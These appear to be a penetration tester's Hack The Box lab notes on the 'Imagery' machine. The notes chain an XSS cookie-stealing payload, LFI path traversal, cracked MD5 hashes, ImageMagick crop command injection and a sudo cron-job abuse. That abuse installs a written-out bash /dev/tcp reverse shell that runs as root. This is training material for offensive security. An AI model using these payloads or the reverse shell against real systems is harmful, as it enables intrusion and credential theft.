# HTB - Imagery

Target: 10.129.46.23 (imagery.htb)

## Recon
- full TCP port scan (scans/scripts.nmap) — note: lots of "adjust_timeouts2 ... Ignoring time" noise in output, harmless (clock/timing warning, not a scan issue)

## Services
- 22/tcp   ssh   OpenSSH 9.7p1 Ubuntu
- 8000/tcp http  Werkzeug 3.1.3 (Python 3.12.7 / Flask dev server) — "Image Gallery"

## Findings
- Response tampering: intercepting/modifying the POST response tied to loading `/` exposes the admin panel UI client-side, but actual admin task endpoints still enforce server-side authz (access denied) — client-side vs server-side auth mismatch, not a full bypass yet
- XSS -> stole admin session cookie via `<img src=x onerror="fetch(...document.cookie)">` payload (see Foothold)
- LFI (as admin) on GET /admin/get_system_log?log_identifier= — path traversal confirmed w/ ../../../../../etc/hosts, full arbitrary file read confirmed (/etc/passwd pulled)
- Error message leaks real base path: `/home/web/web/system_logs/` (app running as `web` presumably)
  - tried /var/log/laurel/audit.log via traversal -> Errno 13 Permission denied (app's user can't read it directly)
- Werkzeug debug PIN derivation attempt (if debug console reachable):
  - boot_id (/proc/sys/kernel/random/boot_id): c75f259b-93e9-48ec-9674-21495f0dfd3e
  - still need: MAC address, app module file path, OS username running process
- /proc/self/environ (via LFI, read within Flask worker process itself):
  ```
  LANG=en_US.UTF-8
  PATH=/home/web/web/env/bin:/sbin:/usr/bin
  USER=web
  LOGNAME=web
  HOME=/home/web
  SHELL=/bin/bash
  SYSTEMD_EXEC_PID=1335
  MEMORY_PRESSURE_WATCH=/sys/fs/cgroup/system.slice/flaskapp.service/memory.pressure
  CRON_BYPASS_TOKEN=K7Zg9vB$24NmW!q8xR0p/runL!
  ```
  - confirms systemd service name: flaskapp.service
  - confirms python venv path: /home/web/web/env/
  - HOME=/home/web answers HTB hint question directly

## Creds
- CRON_BYPASS_TOKEN (env var, flaskapp.service): K7Zg9vB$24NmW!q8xR0p/runL!
- /var/backup/web_20250806_120723.zip.aes password (cracked via pybrute.py + rockyou.txt): bestfriends
- backup db.json (loot/web/db.json) has 2 extra users not in live db.json:
  - mark@imagery.htb — MD5 hash: 01c3d2e5bdaf6134cec0a367cf53e535 -> cracked: supersmash (isAdmin:false) — matches system user `mark` (uid 1002) from /etc/passwd
    - direct SSH as mark needs a pubkey (password auth apparently off for that account) — using `su mark` from existing web SSH session instead
  - web@imagery.htb — MD5 hash: 84e3c804cf1fa14306f26f9f3da177e0 (isAdmin:true)

## Notes / dead ends
- /etc/crontab is just stock Debian default (hourly/daily/weekly/monthly run-parts) — no custom jobs referencing the token. Check /etc/cron.d/*, /var/spool/cron/crontabs/<user>, or systemd timers (*.timer units) instead.
- Werkzeug debug console: DEAD END — app.py confirms `app_core.run(debug=False, ...)`, debugger not reachable

## App source (read via unrestricted LFI path traversal, confirmed escapes any base-dir restriction)
- /home/web/web/api_admin.py — root cause of the LFI confirmed: `get_system_log` calls `_process_path_input()` to sanitize into `sanitized_log_file_for_show`, but then builds the actual path with the RAW `requested_log_file` param instead (`os.path.join(SYSTEM_LOG_FOLDER, requested_log_file)`) — sanitized var is computed but never used
  - other routes here: report_bug, admin/users, admin/delete_user, admin/bug_reports, admin/delete_bug_report, admin/impersonate_testuser (impersonates `testuser@imagery.com`, note: .com not .htb), admin/return_to_admin
  - no backup/AES code in this file — check api_misc.py or utils.py next for the AES-encrypted backup hint
- /home/web/web/app.py — Flask app, blueprints: bp_auth, bp_upload, bp_manage, bp_edit, bp_admin, bp_misc (api_auth.py, api_upload.py, api_manage.py, api_edit.py, api_admin.py, api_misc.py)
  - imports `_load_data`/`_save_data` from utils.py; constants (SYSTEM_LOG_FOLDER, BLOCKED_APP_PORTS, likely data filename) from config.py
- /home/web/web/config.py:
  ```
  DATA_STORE_PATH = 'db.json'
  UPLOAD_FOLDER = 'uploads'
  SYSTEM_LOG_FOLDER = 'system_logs'
  MAX_LOGIN_ATTEMPTS = 10
  ACCOUNT_LOCKOUT_DURATION_MINS = 1
  BYPASS_LOCKOUT_HEADER = 'X-Bypass-Lockout'
  BYPASS_LOCKOUT_VALUE = os.getenv('CRON_BYPASS_TOKEN', 'default-secret-token-for-dev')
  FORBIDDEN_EXTENSIONS = {php,php3,php4,php5,phtml,exe,sh,bat,cmd,js,jsp,asp,aspx,cgi,pl,py,rb,dll,vbs,vbe,jse,wsf,wsh,psc1,ps1,jar,com,svg,xml,html,htm}
  BLOCKED_APP_PORTS = {8080, 8443, 3000, 5000, 8888, 53}
  OUTBOUND_BLOCKED_PORTS = {80, 8080, 53, 5000, 8000, 22, 21}
  PRIVATE_IP_RANGES = [127.0.0.0/8, 172.0.0.0/12, 10.0.0.0/8, 169.254.0.0/16]
  AWS_METADATA_IP = 169.254.169.254
  IMAGEMAGICK_CONVERT_PATH = '/usr/bin/convert'
  EXIFTOOL_PATH = '/usr/bin/exiftool'
  ```
  - **DATA_STORE_PATH = 'db.json' — answers HTB hint**
  - db.json contents (users):
    - admin@imagery.htb — password hash (MD5): 5d9c1d507a3f76af1e5c97a3ad1eaa31 — isAdmin:true, displayId:a1b2c3d4
    - testuser@imagery.htb — password hash (MD5): 2c65c8d7bfbca32a3ed42596192384f6 — isAdmin:false, isTestuser:true, displayId:e5f6g7h8
    - also has top-level `images` and `image_collections` arrays
  - **CRON_BYPASS_TOKEN's real purpose**: value of BYPASS_LOCKOUT_VALUE, checked against `X-Bypass-Lockout` header -> bypasses login lockout (MAX_LOGIN_ATTEMPTS/ACCOUNT_LOCKOUT_DURATION_MINS)
  - ImageMagick `convert` + exiftool used server-side on uploads (both have known RCE CVE history — ImageTragick, exiftool DjVu RCE)
  - SSRF-style protections present (private IP ranges, AWS metadata IP, outbound port blocklist) -> implies a URL-fetch feature somewhere in upload/transform flow

## Users (/etc/passwd, non-system accounts)
- root:x:0:0:root:/root:/bin/bash
- web:x:1001:1001::/home/web:/bin/bash
- mark:x:1002:1002::/home/mark:/bin/bash
- _laurel:x:101:988::/var/log/laurel:/bin/false (audit log formatter)

## Creds
-

## Foothold
- XSS payload (img/onerror, fetch to local http.server) delivered to admin -> exfiltrated admin session cookie
- Admin session cookie -> /admin/get_system_log LFI (log_identifier param)
- RCE path (api_edit.py, bp_edit blueprint):
  - POST /apply_visual_transform — gated on session['is_testuser_account'] (not isAdmin) — must be logged in as testuser
  - takes imageId, transformType, params (JSON)
  - transformType=crop: params.x/y/width/height go straight into an f-string shell command:
    `f"{IMAGEMAGICK_CONVERT_PATH} {original_filepath} -crop {width}x{height}+{x}+{y} {output_filepath}"`
    run via `subprocess.run(command, shell=True, ...)` — unsanitized -> shell command injection via width/height/x/y
  - plan: log in as testuser (creds from config.py/db.json), upload an image to get imageId, send crop transform request with injection payload in width/height
  - CONFIRMED: shell obtained as `web` via crop RCE

## Privesc
- /home/web/web/bot/ — root-owned directory (drwxr-xr-x root root) sitting inside web's writable project dir — worth investigating, likely tied to the CRON_BYPASS_TOKEN / scheduled backup thread
- sudo -l as mark: `(ALL) NOPASSWD: /usr/local/bin/charcol` — custom binary, next to investigate
  - /usr/local/bin/charcol: -rwxr-x--- root root, only 69 bytes (script/wrapper, not compiled binary) — mark can't read/execute directly (not in owning group), sudo env vars blocked (LD_PRELOAD rejected by sudoers)
  - /usr/local/lib/charcol is actually a DIRECTORY (not a file) — fully inaccessible to mark (no read/list/exec). Both static analysis paths (strings, reading bin/lib) are dead ends -> fall back to black-box: just run `sudo /usr/local/bin/charcol` and observe behavior/output/filesystem side effects
  - `sudo /usr/local/bin/charcol` -> banner: "Charcol The Backup Suit - Development edition 1.0.0", already set up. Subcommands: `charcol shell` (interactive), `charcol help`
  - `charcol shell` prompts for an internal password before dropping into "a system shell" — this password (not sudo/system password) is the next thing to find
  - `charcol help` -> flags: `--quiet`, `-R`/`--reset-password-to-default` ("Reset application password to default (requires system password verification)") — big lead: resets internal charcol password to a known default, gated only on mark's own system password (which we have: supersmash)
  - `sudo /usr/local/bin/charcol -R` + mark's system password (supersmash) -> removed /root/.charcol/.charcol_config, app now in "no password mode" -> next: rerun `sudo /usr/local/bin/charcol shell` for root shell
  - CORRECTION: `charcol shell` is NOT a real system shell — it's a restricted custom REPL that only accepts a fixed set of "Charcol" commands (blocks whoami/ls/pwd etc as unrecognized).
  - Full command set (charcol shell `help`): backup, fetch <url> (SSRF-blocked on loopback), list/check/extract (archive ops), auto add/list/edit/delete (cron job management), shell, exit, clear, help
  - **Privesc vector: `auto add --schedule "<cron>" --command "<shell_command>" --name "<job_name>"`** — help text explicitly states "Charcol does NOT validate the safety of the --command". Runs as root (whole REPL is under sudo). In "no password mode" (status 2), `auto add` requires re-verifying mark's system password (have: supersmash) but no charcol app password needed.
  - next: `auto add` with a malicious --command (e.g. SUID bash, reverse shell, or SSH key drop), schedule for near-term/next-minute execution
  - alt vector: `fetch <url> -o <output_file>` — downloads to arbitrary path (if -o isn't hard-restricted to /var/backup/) as root, 664 perms -> potential root arbitrary-file-write (e.g. drop into /root/.ssh/authorized_keys). Only loopback is explicitly blocked per help text (unlike webapp's own broader PRIVATE_IP_RANGES SSRF protection in config.py) — separate code path, may be less restricted
  - CONFIRMED: `auto add --schedule "* * * * *" --command "bash -i >& /dev/tcp/10.10.15.212/9002 0>&1" --name "root shell"` added successfully (job ID 81393cd0-4cc8-4f42-953d-bc8f447d5aab), cron line confirmed: `* * * * * CHARCOL_NON_INTERACTIVE=true bash -i >&/dev/tcp/10.10.15.212/9002 0>&1` — waiting on next minute tick for root shell callback on :9002
- /usr/local/bin/ also has `chromedriver` (18MB) and `pyAesCrypt` — chromedriver confirms headless browser automation on box (ties to bot/ dir and .pki/nssdb Firefox-profile-shaped lead from earlier, though chromedriver itself is Chrome not Firefox)
- ~/.pki/nssdb/ (cert9.db, key4.db, pkcs11.txt) — NSS cert/key db, implies a Firefox profile on box (probably tied to bot/ headless browser automation). Check for sibling logins.json/cookies.sqlite; firefox_decrypt.py can pull saved creds if no master password set
- ~/.local/bin/ has `pyAesCrypt` and `wsdump` installed (pip user install) — confirms pyAesCrypt tool is on-box, only discoverable post-exploit (not referenced in web app source)
  - pyAesCrypt is a symlink -> /home/web/.local/share/pipx/venvs/pyaescrypt/bin/pyAesCrypt (pipx-managed)
  - wsdump = websocket-client's CLI debug tool (stock/generic entrypoint script, nothing custom) -> implies a websocket service exists somewhere on box, worth checking `ss -tlnp` / `netstat` for listening ports beyond 22/8000
- **AES-encrypted backup found: /var/backup/web_20250806_120723.zip.aes — answers HTB hint**
  - plan: pull .aes file to kali, brute-force decryption password with pyAesBrute (or similar) + rockyou.txt

## Flags
- user: popped (su mark, cracked password from backup db.json)
- root: popped (charcol -R password reset -> auto add cron RCE, bash -c wrapper needed for /dev/tcp under dash)
